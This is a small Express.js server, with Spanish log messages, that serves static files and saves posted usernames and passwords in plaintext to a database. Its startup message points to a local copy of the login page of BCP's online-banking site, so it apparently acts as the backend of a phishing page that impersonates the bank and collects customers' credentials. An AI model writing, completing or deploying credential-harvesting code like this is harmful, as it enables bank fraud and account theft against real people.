const express = require('express');
const bodyParser = require('body-parser');
const User = require('./User');

const app = express();
const port = 3000;


app.use(bodyParser.json());
app.use(express.static('public'));

app.post('/save-data', async (req, res) => {
  try {
    const { username, password } = req.body;
    await User.create({ username, password });
    res.sendStatus(200);
  } catch (error) {
    console.error('Error al guardar los datos:', error);
    res.sendStatus(500);
  }
});

app.listen(port, () => {
  console.log(`Servidor escuchando en http://localhost:${port}/BCP/www.bancaporinternet.bcp.com.bo/Account/Login.html`);
});
